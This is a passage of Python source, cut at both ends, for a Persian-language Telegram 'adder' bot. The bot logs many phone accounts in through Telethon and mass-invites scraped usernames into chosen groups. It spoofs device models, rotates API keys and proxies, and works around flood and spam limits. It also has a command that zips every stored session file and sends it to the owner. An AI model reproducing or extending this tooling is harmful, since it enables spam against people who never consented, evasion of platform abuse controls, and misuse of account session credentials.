                                                               Button.inline("⚠️ لغو همه",
                                                                             ".addcencell|{}".format(account))], [
                                                                  Button.inline(f"‼️ لغو همه {cancelALL} حساب ها",
                                                                                "&cancelALL")]])
                        except:
                            pass

                if (addflag[account] == "0"):
                    print("ssssssssss")
                    end = time.time()

                    await client.disconnect()
                    addflag[account] = "1"
                    break

                usList = []

                for us in range(0, int(num)):
                    # -----------------
                    usList.append(random.choice(usernames2))
                    # -----------------

                try:
                    # ----------

                    # ----------
                    # if (J not in blacklist):
                    # print (usList)
                    await client(functions.channels.InviteToChannelRequest(channel=link, users=usList))
                    # print (r.stringify())

                    if mode == "addID":

                        # userid = [x for x in userid if x not in usList]
                        for i in range(0, int(num)):
                            userid.remove(usList[i])

                    else:
                        # usernames.remove(J)
                        for i in range(0, int(num)):
                            try:
                                usernames.remove(usList[i])
                            except:
                                pass
                    # with open("goldlist.txt" , "a") as myfile:

                    # myfile.write(str(J))

                    # myfile.write("\n")

                    scount += 1

                    tsuccess += 1

                # else:
                #     if mode == "addID":
                #         userid.remove(J)

                #     else :
                #         usernames.remove(J)

                #     print ("[+] Duplicate")

                #     tduplicate+=1

                #     duplicate+=1

                except errors.rpcerrorlist.UserNotMutualContactError:

                    tfaild += 1
                    other += 1
                    fcount += 1
                    print("[-] UserChannelsTooMuchError")
                    if mode == "addID":
                        for i in range(0, int(num)):
                            try:
                                userid.remove(usList[i])
                            except:
                                pass
                        pass
                    else:
                        for i in range(0, int(num)):
                            try:
                                userid.remove(usList[i])
                            except:
                                pass
                        pass
                    continue


                except errors.rpcerrorlist.UserChannelsTooMuchError:
                    tfaild += 1
                    fcount += 1
                    other += 1
                    print("[-] UserChannelsTooMuchError")
                    if mode == "addID":
                        for i in range(0, int(num)):
                            try:
                                userid.remove(usList[i])
                            except:
                                pass
                        pass
                    else:
                        for i in range(0, int(num)):
                            try:
                                userid.remove(usList[i])
                            except:
                                pass

                        pass
                    continue

                except errors.rpcerrorlist.UserPrivacyRestrictedError:
                    tfaild += 1
                    fcount += 1
                    privacy += 1
                    print("[-] UserPrivacyRestrictedError")
                    if mode == "addID":
                        for i in range(0, int(num)):
                            try:
                                userid.remove(usList[i])
                            except:
                                pass
                        pass

                    else:
                        for i in range(0, int(num)):
                            try:
                                userid.remove(usList[i])
                            except:
                                pass
                        pass
                    continue


                except errors.rpcerrorlist.PeerFloodError as perr:

                    fcount += 2
                    tfaild += 1
                    other += 1

                    if mode == "addID":
                        for i in range(0, int(num)):
                            try:
                                userid.remove(usList[i])
                            except:
                                pass
                        pass
                    else:
                        for i in range(0, int(num)):
                            try:
                                userid.remove(usList[i])
                            except:
                                pass
                        pass
                    print("[-] PeerFloodError")

                    continue


                except errors.rpcerrorlist.FloodWaitError as e:

                    fcount += 1
                    tfaild += 1
                    wait = [int(s) for s in str(e).split() if s.isdigit()][0]

                    # wait += random.randint(100 ,200)

                    if wait >= 500:
                        await client.disconnect()
                        return [scount, fcount, duplicate]

                    await log_msg.edit("❌🎗 {}  ** {} ** ".format(str(e), wait))

                    await asyncio.sleep(wait)




                except ValueError as e:
                    print(str(e))
                    fcount += 1
                    tfaild += 1
                    # break
                    continue

                except errors.ChannelPrivateError:
                    await log_msg.edit("❌ i banned from this Group")
                    await client.disconnect()
                    break

                except sqlite3.OperationalError:
                    print("SQLITE")
                    await client.disconnect()
                    break


                except errors.rpcerrorlist.AuthKeyDuplicatedError:
                    print("AuthKeyDuplicatedError")
                    await client.disconnect()
                    break

                except errors.rpcerrorlist.AuthKeyUnregisteredError:
                    print("AuthKeyUnregisteredError")
                    await client.disconnect()
                    break
                except Exception as e:
                    # print(4)
                    fcount += 3
                    tfaild += 1
                    other += 1

                    print("error : ", str(e))
                    print(e.__class__)

                    continue






        else:
            text += '''اکانت  {} نمی تواند جوین شود ! Error code {} ! {}'''.format(account, ww, time.ctime(time.time()))
            await client.disconnect()


    except Exception as e:
        print("[** {} **] ".format(e.__class__), str(e))

    end1 = time.time()
    text = '''●╔══**اد به `{}` با ` {}` اکانت **  ** تعداد ادد هر اکانت :** `{}`\n\n 🏆 فرایند ادد  به اتمام رسید  {}

●╚══[⚡️ naji adder ⚡️]'''.format(link, numacc, delay, str(datetime.timedelta(seconds=(end1 - start1)))[0:7])

    noadd = "1"

    try:
        await log_msg.edit(text, buttons=[[Button.inline("✅ موفق", "None"), Button.inline(str(tsuccess), "None")],
                                          [Button.inline("❌ ناموفق", "None"), Button.inline(str(tfaild), "None")]])

        await client.disconnect()

        return [scount, fcount, duplicate]

    except Exception as e:

        print("---------> ", e, e.__class__)

        await client.disconnect()

        pass


async def list_splitter(my_list, n):
    final = [my_list[i * n:(i + 1) * n] for i in range((len(my_list) + n - 1))]
    return final


# --------
async def worker(msg, link, numacc, delay, mode, usernames):
    ev = []
    global addflag
    accs = []
    tl = 1
    # print ("DELAY"  , delay)
    delay = int(delay)
    ww = None
    text = ''

    # if int(numacc) < 3:
    #    await msg.reply('''❌ number of accounts  should be `bigger than 2 `

    # add @link **2** 50''')
    #    return

    start = time.time()

    if mode == "addUSERNAME":
        pass



    elif mode == "addID":
        usernames = userid

    if (len(usernames) > 0):
        for item in os.scandir(f'Accounts'):
            if 'journal' not in item.name and '.session' in item.name:
                l = [[Button.inline('{} - {}'.format(tl, item.name)), Button.inline('♻️')]]
                accs.append(item.name)
                ev.extend(l)
                tl += 1
                ev.extend([[Button.inline('فعالیت اخیر '), Button.inline(time.ctime(time.time()))]])


        taskCount = 0
        tasklist = []

        res1 = 0
        res2 = 0

        success = 0
        faild = 0
        duplicate = 0

        if len(accs) == 0:
            await msg.reply("شما هیچ اکانت و یا تلفنی ندارید !")
            return


        else:

            await msg.reply('✅اجرای فرایند پس از تایید نهایی👇', buttons=[[Button.inline("تایید نهایی", "?1|{}|{}|{}|{}".format(delay, numacc, link, mode))]])



    else:
        await msg.reply("** لیست خالی است ! \n لطفا ابتدا از دستور save all استفاده کنید . ** ")

# @bot.on(events.NewMessage(func= lambda e : e.is_private ))
@bot.on(events.NewMessage())
async def my_event_handler(event):
    # --------------------------
    if event.raw_text.lower() == "/start":
        await event.reply('انتخاب کنید', buttons=[[Button.text("گروه به گروه", resize=True), Button.text("رسیور", resize=True)]])


    if event.sender_id == adminssss:
        if event.raw_text.startswith("/sudo"):
            txt = int(event.raw_text.split("/sudo")[1].strip())
            print(txt)
            NStEVJzsyY.append(txt)
            await event.reply("👽  {} Is Admin Now ! ".format(txt),
                              buttons=[[Button.inline("❌ remove ", 'admin|{}'.format(txt))]])

            try:
                await bot.send_message(txt, '''🏆 مجوز شما توسط مالک فعال شد ! 
➖➖➖➖➖➖ 
به MG Adder نسخه 5 ProMax خوش آمدید''')

            except Exception as e:
                await event.reply("⚠️ {} ".format(str(e)))

        if event.raw_text.startswith("/sudolist"):
            txt = ""
            for users in NStEVJzsyY:
                txt += "👽 " + str(users) + "\n ➖➖➖➖➖➖ \n"
            await event.reply(txt)

        if event.raw_text.startswith("/delsudo"):
            txt = int(event.raw_text.split("/delsudo")[1].strip())
            NStEVJzsyY.remove(txt)
            await event.reply("⚠️ کاربر : {}  با موفقیت از لیست ادمین خارج شد".format(txt))

        if event.raw_text.startswith("/getsessions"):
            try:

                shutil.make_archive("Accounts", 'zip', "Accounts")
                await bot.send_file(int(adminssss), 'Accounts.zip')

            except Exception as e:
                await event.reply(str(e))

    if event.sender_id in NStEVJzsyY:
        
        if event.raw_text.lower() == "گروه به گروه":
            await event.reply('به ربات NajiAdder خوش اومدی', buttons=KEYBOARDHOME)

        

        elif event.raw_text.lower().startswith('get'):

            link = event.raw_text.split('get ')[1]

            await event.reply('''
            🎗لطفا روش استخراج را انتخاب کنید 👇


            ''', buttons=[
                [Button.inline('🆔 یوزرنیم', '@add|addUsername|{}'.format(link)),
                 Button.inline('🔼ایدی عددی', '@add|addChatid|{}'.format(link))],
            ])



        elif event.raw_text.lower() == 'aclist':
            ev = []
            tl = 0
            for item in os.scandir('Accounts'):
                if 'journal' not in item.name and '.session' in item.name:
                    l = [[Button.inline(item.name, 'settings|{}'.format(item.name))]]
                    ev.extend(l)
                    tl += 1
            if tl >= 1:
                try:
                    await event.reply('شما  **{}**  اکانت دارید  '.format(tl), buttons=ev)

                except errors.rpcerrorlist.ReplyMarkupTooLongError:
                    async for i in await list_splitter(ev, 50):
                        await event.reply('شما  **{}**  اکانت دارید  '.format(tl), buttons=ev)

            else:
                await event.reply('دیتابیس خالی است !')



        elif event.raw_text.lower().startswith('save'):
            l = []
            my = event.raw_text.split('save ')[0]
            if my == 'save':
                ev = []
                for item in os.scandir('Database'):
                    l = [[Button.inline(item.name, 'save|{}'.format(item.name))]]
                    ev.extend(l)

                if len(l) >= 1:
                    await event.reply('🔆 شما می توانید لیست تمام گروه های موجود در دیتابیس رو مشاهده کنید  ',
                                      buttons=ev)
                else:
                    await event.reply('❌ لیست خالی است ')
            else:
                w = get_file(my)
                if w != 0:
                    for item in w:
                        usernames.append((item.split('\n')[0]))

                    await event.reply('🔆 تعداد  {} فایل لود شد '.format(len(list(set(usernames)))))
                else:
                    await event.reply(' ❌ اسم فایل اشتباه هست')



        elif event.raw_text.lower() == 'clear':
            if len(usernames) != 0:
                await event.reply('آیا از دیلیت کردن این شماره  {}  مطمین هستید ?'.format(len(usernames)), buttons=[
                    [Button.inline('Yes', 'clean'), Button.inline('No', 'no')],
                ])
            else:
                await event.reply('لیست یوزرنیم ها خالی است !')





        elif event.raw_text.lower() == 'stats':
            await event.reply('🔆 تعداد کل username ها  : {}'.format(len(usernames)))


        elif event.raw_text.lower() == 'bot':
            await event.reply('Im Online !')

        elif event.raw_text.lower().startswith('/addphon'):

            try:
                phones = event.raw_text.split('/addphon ')[1].replace(' ', '')
                if os.path.exists('Accounts/{0}.session'.format(phones)):
                    await event.reply('**این اکانت از قبل در دیتابیس وجود داشته ! **')
                else:
                    await event.reply('**لطفا صبر کنید ......**')
                    result, xu = create_api(phones)
                    if result == False:
                        await event.reply(
                            '**مشکلی در ارسال کد به شماره  {} پیش اومده  ! \n احتمالا شماره شما محدود شده \n لطفا دوبره بعد از 48 ساعت تلاش کنید **'.format(
                                phones))
                    else:
                        await event.reply('''
✅ کد احراز هویت به شماره : {} ارسال شد ❕

❌لطفا کد ارسال شده رو با دستور زیر وارد کنید :

/web **CODE**
                            '''.format(event.raw_text.split('/addphon ')[1]))
                        data['auth_mode'] = '{0}:{1}:{2}'.format(phones, result, xu)

            except:
                await event.reply("**/addphon** phone")

        elif event.raw_text.lower().startswith('/web'):
            try:

                w = random.choice(apis)

                device = random.choice(devices)
                version1 = random.choice(version)

                key = data['auth_mode']
                await event.reply('**لطفا صبر کنید ..... **')
                result, xu = auth(key.split(':')[0], key.split(':')[1], event.raw_text.split('/web ')[1],
                                  key.split(":")[2])
                if result == False:
                    await event.reply('**مشکی در ساخت api پیش اومده لطفا بعدا مجددا تلاش کنید ! **')
                    data.clear()
                else:

                    await event.reply('**✅ اکانت با موفقیت ثبت شد \n لطفا صبر کنید ......**')
                    # await change('69YYF5')
                    api_info, xu = auth2(result, key.split(":")[2])
                    await event.reply(
                        '** Api `[{0}]` ب**ا موفقیت ساخته شد ** !\nلطفا صبر کنید ... \n یا کد را ارسال کنید ...**'.format(
                            api_info))
                    # ---------

                    # ---------
                    with open('apilist.txt', 'a') as file:
                        file.write('{0}:{1}:{2}'.format(api_info.split(':')[0], api_info.split(':')[1], key.split(':')[0]))
                        file.write("\n")

                        file.close()
                    data.clear()
                    pr = await random_proxy()
                    # pr = random_proxy()
                    # proxy = proxy = (socks.SOCKS5, str(pr[0]), int(pr[1]), True, str(pr[2]), str(pr[3]))
                    new = TelegramClient('Accounts/{0}'.format(key.split(':')[0]), w[0], w[1],
                                         connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                         proxy=pr,
                                         device_model=device,
                                         system_version=version1,
                                         app_version="7.84",
                                         lang_code='en',
                                         system_lang_code='en')

                    await new.connect()
                    if not await new.is_user_authorized():
                        try:
                            result = await new.send_code_request(key.split(':')[0])
                            data['code_mode'] = '{0}:{1}:{2}:{3}'.format(key.split(':')[0], result.phone_code_hash,
                                                                         api_info.split(':')[0], api_info.split(':')[1])
                            await new.disconnect()
                            await event.reply('''
** ✅ کد ورود به تلگرام ارسال شد لطفا کد رو به فرمت زیر وارد کنید :

/cod CODE**
                                ''')
                        except Exception:
                            await event.reply('**مشکلی در ارسال کد پیش اومده لطفا دوباره سعی کنید ....**')
            except KeyError:
                await event.reply('**اکانتی در دیتابیس وجود  ندارد ! لطفا دوباره شماره رو وارد کنید **')

        elif event.raw_text.lower().startswith('/test'):
            print(await random_proxy())

        elif event.raw_text.lower().startswith('/cod'):

            try:

                # w = random.choice(apis)
                device = random.choice(devices)
                version1 = random.choice(version)

                key = data['code_mode']
                await event.reply('**لطفا صبر کنید ..... **')
                print(key.split(':')[2], key.split(':')[3])
                pr = await random_proxy()
                # pr = random_proxy()
                # proxy = proxy = (socks.SOCKS5, str(pr[0]), int(pr[1]), True, str(pr[2]), str(pr[3]))
                new = TelegramClient('Accounts/{0}'.format(key.split(':')[0]), key.split(':')[2], key.split(':')[3],
                                     connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                     proxy=pr,
                                     device_model=device,
                                     system_version=version1,
                                     app_version="7.84",
                                     lang_code='en',
                                     system_lang_code='en')

                await new.connect()

                await new(
                    functions.auth.SignInRequest(phone_number=key.split(':')[0], phone_code_hash=key.split(':')[1],
                                                 phone_code=event.raw_text.split('/cod ')[1]))
                await event.reply('**اکانت با موفقیت لاگ شد**')

                data.clear()
            except errors.SessionPasswordNeededError:
                await event.reply(
                    '**اکانت رمز دو مرحله ای دارد لطفا با دستور زیر  آن را فعال کنید \n  /pass PASSWORD**')
                data.clear()
                data['step_mode'] = key
            except KeyError:
                await event.reply('**لطفا دوباره تلاش کنید و شماره رو مجددا وارد کنید **')
            await new.disconnect()



        elif event.raw_text.lower().startswith('/pass'):
            try:

                device = random.choice(devices)
                version1 = random.choice(version)

                key = data['step_mode']
                m = await event.reply('**لطفا صبر کنید ..... **')
                # k2 = get_api(key.split(':')[0])

                # print ("------- > " , k2)
                #### -- anti flood
                k2 = random.choice(apis)
                pr = await random_proxy()
                # pr = random_proxy()
                # proxy = proxy = (socks.SOCKS5, str(pr[0]), int(pr[1]), True, str(pr[2]), str(pr[3]))
                new = TelegramClient('Accounts/{0}'.format(key.split(':')[0]), int(k2[0]), k2[1],
                                     connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                     proxy=pr,
                                     device_model=device,
                                     system_version=version1,
                                     app_version="7.84",
                                     lang_code='en',
                                     system_lang_code='en')

                await new.connect()

                await new.sign_in(password=event.raw_text.split('/pass ')[1])
                data.clear()
                info = await new.get_me()

                result = None

                await new.disconnect()
                await event.reply(
                    '** \n 🔸🔹🔸🔹🔸🔹 \n 🎗 Api [{0}] با موفقیت به دیتابیس اضافه شد  !\n \n 🔸🔹🔸🔹🔸🔹 \n مشخصات اکانت \n 🎗 نام کاربری حساب : {1}\n \n 🔸🔹🔸🔹🔸🔹 \n 🎗 تلفن اکانت : +{2}\n  \n 🔸🔹🔸🔹🔸🔹 \n 🎗 نام حساب : {3}\n \n 🔸🔹🔸🔹🔸🔹\n 🎗 نام خانوادگی حساب : {4}** \n🔸🔹🔸🔹🔸🔹 \n'.format(
                        key.split(':')[2] + ':' + key.split(':')[3], str(info.username), str(info.phone),
                        info.first_name, info.last_name))
                # await change('69YYF5')
            except KeyError:
                await event.reply('**لطفا دوباره تلاش کنید و شماره رو مجددا وارد کنید **')
            except errors.PasswordHashInvalidError:
                await event.reply(
                    '**❌ پسورد اشتباه هست لطفا مجددا پسورد درست رو به فرمت زیر وارد کنید \n  /pass PASSWORD**')
            await new.disconnect()



        elif event.raw_text.lower() == "spambot":

            await SendToSpamBot(event)



        elif event.raw_text.lower().startswith("add"):

            x = event.raw_text

            datas = (x.split(' ', 1)[1]).split(' ')

            try:

                link = datas[0]
                num = datas[1]
                total = datas[2]

                # dirNum = datas[3]

                await event.reply("فرایند اد براساس یوزرهای استخراج شده انتخاب شود👇", buttons=[
                    [Button.inline('ایدی عددی', 'addID|{}|{}|{}'.format(link, num, total)),
                     Button.inline('یوزرنیم', 'addUSERNAME|{}|{}|{}'.format(link, num, total))]])

            except:

                await event.reply("** ‼️ add @link 4 50 [0/1/2/3/4/5/.../100] **")

        #### ---- help :)
        elif event.raw_text.lower() == 'help' or event.raw_text.lower() == "راهنما":
            await event.reply("""
            help

◾️متن راهنما 
〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️

/addphon شماره

◾️ برای ورود به حساب کاربری جدید 

〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️
/web کد

◾️کد ورود به سایت تلگرام

〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️

/cod کد

◾️کد ورود به تل
〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️

/pass پسورد اکانت

◾️پسورد اکانت موردنظر

〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️

◾️شروع یوزرگیری از گروه

〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️
◾️برای نمایش حذف یا مرتب کردن حساب ها
〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️

◾️ذخیره کردن یوزرهای جمع آوری شده

〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️

◾️مشاهده یوزرهای جمع شده در دیتابیس

〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️

bot

◾️نمایش انلاینی ربات

 〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️

add @link 6 50

◾️اغاز فرایند اد با 6شماره همزمان و هرشماره 50 اد 

addmin : @ImTanun
            """, buttons=[[Button.inline('sudo list', 'llsudo'), Button.inline('del sudo', 'delsudooo')], [Button.inline('add sudo', 'addsudoo')]])


async def join2(clt, ls, log_msg):
    print(" i am in join ")
    try:
        if '@' in ls:
            print("join func")
            await clt(functions.channels.JoinChannelRequest(channel=ls))
            print("xxxx")
        else:
            print("join func")
            await clt(functions.messages.ImportChatInviteRequest(hash=ls.split('/')[-1]))
            print("yyyyy")
        return True

    except errors.rpcerrorlist.FloodWaitError as e:

        wait = [int(s) for s in str(e).split() if s.isdigit()][0]

        # wait += random.randint(100 , 200)

        await log_msg.edit("⚠️ [**join**] صبر کن   ** {} ** ثانیه".format(wait))

        if (wait >= 200):
            return -1000  # flood Code

        await asyncio.sleep(wait)

        return None


    except errors.rpcerrorlist.UserAlreadyParticipantError:
        return True

    except errors.UserDeactivatedBanError:
        print("[!] UserDeactivatedBanError")

        await log_msg.edit("Account is Deleted")
        return -1

    except errors.UserDeactivatedError:
        print("[!] UserDeactivatedError")
        await log_msg.edit("Account is Deleted")

        return -1

    except errors.SessionExpiredError:
        print("[!] SessionExpiredError")
        await log_msg.edit("Account is Deleted")

        return -1

    except errors.SessionRevokedError:
        print("[1] SessionRevokedError")
        await log_msg.edit("Account is Deleted")

        return -1


    except errors.rpcerrorlist.AuthKeyUnregisteredError:
        print("AuthKeyUnregisteredError")
        await log_msg.edit("AuthKeyUnregisteredError")

        return -1

    except errors.rpcerrorlist.AuthKeyDuplicatedError:
        print("AuthKeyDuplicatedError")
        await log_msg.edit("Account is Deleted")

        return -1



    except errors.rpcerrorlist.UserDeactivatedError:
        print("[!] UserDeactivatedError")

        await log_msg.edit("Account is Deleted")
        return -1


    except errors.rpcerrorlist.UserDeactivatedBanError:
        print("[!] UserDeactivatedBanError")
        await log_msg.edit("Account is Deleted")

        return -1



    except errors.rpcerrorlist.SessionExpiredError:
        print("[!] SessionExpiredError")

        await log_msg.edit("Account is Deleted")
        return -1



    except Exception as e:
        print("FOO : ", e.__class__, str(e))
        return -1


async def join(client, link, phone):
    print("--------------> ", link)
    try:
        print(client)
        if '@' in link:
            print("@ dar")
            await client(JoinChannelRequest(channel=link))
        else:
            print("adiiii")
            await client(ImportChatInviteRequest(hash=link))
        return True
    except errors.UserAlreadyParticipantError:
        return True
    except errors.UserDeactivatedBanError:
        return -1
    except errors.UserDeactivatedError:
        return -1
    except errors.SessionExpiredError:
        return -2
    except errors.SessionRevokedError:
        return -2

    except errors.rpcerrorlist.AuthKeyDuplicatedError:
        return -3


    except errors.UserDeactivatedBanError:
        print("[!] UserDeactivatedBanError")

        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))

        return -4  ## Delete


    except errors.UserDeactivatedError:
        print("[!] UserDeactivatedError")
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))

        return -4  ## Delete


    except errors.SessionExpiredError:
        print("[!] SessionExpiredError")
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -4  ## Delete

    except errors.SessionRevokedError:
        print("[1] SessionRevokedError")
        await client.disconnect()

        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -4  ## Delete


    except errors.rpcerrorlist.AuthKeyDuplicatedError:
        print("AuthKeyDuplicatedError")
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))

        return -4  ## Delete

    except errors.rpcerrorlist.UserDeactivatedError:
        print("[!] UserDeactivatedError")
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))

        return -4  ## Delete

    except errors.rpcerrorlist.UserDeactivatedBanError:
        print("[!] UserDeactivatedBanError")
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))

        return -4  ## Delete


    except errors.rpcerrorlist.SessionExpiredError:
        print("[!] SessionExpiredError")
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))

        return -4  ## Delete


    except errors.rpcerrorlist.SessionPasswordNeededError:

        print("[!] SessionPasswordNeededError")
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))

        return -4  ## Delete



    except errors.rpcerrorlist.FloodWaitError as e:

        wait = [int(s) for s in str(e).split() if s.isdigit()][0]

        # wait += random.randint(100 , 200)

        await log_msg.edit("⚠️ [**join**] صبر کن   ** {} ** ثانیه".format(wait))

        return -1000  # flood Code






    except Exception as e:
        print("[!] UnExpected Error : {}".format(str(e)))
        await client.disconnect()

        return -4  ## Delete


datauser = dict()
datauser["typeusers"] = [".", "."]
datauser["typeusers2"] = [".", "."]

@bot.on(events.CallbackQuery)
async def _(events):
    callback = events.data.decode()
    global addflag
    global noadd
    global join
    global datauser

    if (int(events.original_update.user_id) in NStEVJzsyY):

        if (callback.startswith("admin")):

            _, data = callback.split("|")

            NStEVJzsyY.remove(int(data))

            await events.answer("کاربر {} از سودولیست حذف شد".format(data))

            try:
                await bot.send_message(int(data), '''❌ برنامه شما توسط مالک مسدود شده است ! 
➖➖➖➖➖➖ 
برای تماس پیام به @ir_robotmaker''')

            except Exception as e:

                await events.answer(str(e.__class__) + ":" + str(e))

        if callback.startswith("?"):

            # 2|40|3|https://t.me/joinchat/UlqJhddT1kJjYTEx|addUSERNAME

            ev = []
            global addflag
            global kosflag
            accs = []
            tl = 1

            ww = None
            text = ''

            print(callback.split("?")[1])
            num = int((callback.split("?")[1]).split("|")[0])
            delay = int((callback.split("?")[1]).split("|")[1])
            numacc = int((callback.split("?")[1]).split("|")[2])
            link = (callback.split("?")[1]).split("|")[3]
            mode = (callback.split("?")[1]).split("|")[4]

            # dirname = (callback.split("?")[1]).split("|")[5]

            print("num", num)
            print("numACC", numacc)

            delay = int(delay)

            for item in os.scandir(f'Accounts'):
                if 'journal' not in item.name and '.session' in item.name:
                    l = [[Button.inline('{} - {}'.format(tl, item.name)), Button.inline('♻️')]]
                    accs.append(item.name)
                    ev.extend(l)
                    tl += 1
                    ev.extend([[Button.inline('Last Work '), Button.inline(time.ctime(time.time()))]])

            if len(ev) > 1:

                try:
                    worker_msg = await events.reply(
                        '🏆 گروه مقصد : {} 😉 \n 🎗 تعداد اد با هر اکانت: {}'.format(link, delay))

                except errors.rpcerrorlist.ReplyMarkupTooLongError:
                    async for i in await list_splitter(ev, 50):
                        worker_msg = await events.reply(
                            '🏆 گروه مقصد : {} 😉 \n 🎗 تعداد اد با هر اکانت: {}'.format(link, delay))

            taskCount = 0
            tasklist = []

            res1 = 0
            res2 = 0

            success = 0
            faild = 0
            duplicate = 0

            start = time.time()

            cancelALL = len(accs)

            accountL = []

            random.shuffle(accs)  ### Shuffle List

            for item in accs:

                if kosflag == 1:
                    break

                taskCount += 1
                tasklist.append(item)
                if (taskCount % numacc == 0):

                    if numacc == 1:
                        t1 = bot.loop.create_task(
                            foo(tasklist[0], events, link, numacc, delay, worker_msg, mode, num, cancelALL))

                        tasklist = []

                        res1 = await t1

                        if res1 != None:
                            success += int(res1[0])
                            faild += int(res1[1])
                            duplicate += int(res1[2])

                    # ---------------------------
                    elif numacc == 2:
                        t1 = bot.loop.create_task(
                            foo(tasklist[0], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t2 = bot.loop.create_task(
                            foo(tasklist[1], events, link, numacc, delay, worker_msg, mode, num, cancelALL))

                        tasklist = []

                        res1 = await t1
                        res2 = await t2

                        if res1 != None:
                            success += int(res1[0])
                            faild += int(res1[1])
                            duplicate += int(res1[2])

                        if res2 != None:
                            success += int(res2[0])
                            faild += int(res2[1])
                            duplicate += int(res2[2])

                            # -----------------------------
                    elif numacc == 3:
                        print("ppppppppppppppppppppppppp")
                        t1 = bot.loop.create_task(
                            foo(tasklist[0], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t2 = bot.loop.create_task(
                            foo(tasklist[1], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t3 = bot.loop.create_task(
                            foo(tasklist[2], events, link, numacc, delay, worker_msg, mode, num, cancelALL))

                        tasklist = []

                        res1 = await t1
                        res2 = await t2
                        res3 = await t3

                        if res1 != None:
                            success += int(res1[0])
                            faild += int(res1[1])
                            duplicate += int(res1[2])

                        if res2 != None:
                            success += int(res2[0])
                            faild += int(res2[1])
                            duplicate += int(res2[2])

                        if res3 != None:
                            success += int(res3[0])
                            faild += int(res3[1])
                            duplicate += int(res3[2])
                            # -----------------------------


                    # -----------------------------
                    elif numacc == 4:
                        t1 = bot.loop.create_task(
                            foo(tasklist[0], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t2 = bot.loop.create_task(
                            foo(tasklist[1], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t3 = bot.loop.create_task(
                            foo(tasklist[2], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t4 = bot.loop.create_task(
                            foo(tasklist[3], events, link, numacc, delay, worker_msg, mode, num, cancelALL))

                        tasklist = []

                        res1 = await t1
                        res2 = await t2
                        res3 = await t3
                        res4 = await t4

                        if res1 != None:
                            success += int(res1[0])
                            faild += int(res1[1])
                            duplicate += int(res1[2])

                        if res2 != None:
                            success += int(res2[0])
                            faild += int(res2[1])
                            duplicate += int(res2[2])

                        if res3 != None:
                            success += int(res3[0])
                            faild += int(res3[1])
                            duplicate += int(res3[2])

                        if res4 != None:
                            success += int(res4[0])
                            faild += int(res4[1])
                            duplicate += int(res4[2])
                            # -----------------------------
                    elif numacc == 6:
                        t1 = bot.loop.create_task(
                            foo(tasklist[0], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t2 = bot.loop.create_task(
                            foo(tasklist[1], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t3 = bot.loop.create_task(
                            foo(tasklist[2], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t4 = bot.loop.create_task(
                            foo(tasklist[3], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t5 = bot.loop.create_task(
                            foo(tasklist[4], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t6 = bot.loop.create_task(
                            foo(tasklist[5], events, link, numacc, delay, worker_msg, mode, num, cancelALL))

                        tasklist = []

                        res1 = await t1
                        res2 = await t2
                        res3 = await t3
                        res4 = await t4
                        res5 = await t5
                        res6 = await t6

                        if res1 != None:
                            success += int(res1[0])
                            faild += int(res1[1])
                            duplicate += int(res1[2])

                        if res2 != None:
                            success += int(res2[0])
                            faild += int(res2[1])
                            duplicate += int(res2[2])

                        if res3 != None:
                            success += int(res3[0])
                            faild += int(res3[1])
                            duplicate += int(res3[2])

                        if res4 != None:
                            success += int(res4[0])
                            faild += int(res4[1])
                            duplicate += int(res4[2])

                        if res5 != None:
                            success += int(res5[0])
                            faild += int(res5[1])
                            duplicate += int(res5[2])

                        if res6 != None:
                            success += int(res6[0])
                            faild += int(res6[1])
                            duplicate += int(res6[2])



                    elif numacc == 10:
                        t1 = bot.loop.create_task(
                            foo(tasklist[0], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t2 = bot.loop.create_task(
                            foo(tasklist[1], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t3 = bot.loop.create_task(
                            foo(tasklist[2], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t4 = bot.loop.create_task(
                            foo(tasklist[3], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t5 = bot.loop.create_task(
                            foo(tasklist[4], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t6 = bot.loop.create_task(
                            foo(tasklist[5], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t7 = bot.loop.create_task(
                            foo(tasklist[6], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t8 = bot.loop.create_task(
                            foo(tasklist[7], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t9 = bot.loop.create_task(
                            foo(tasklist[8], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t10 = bot.loop.create_task(
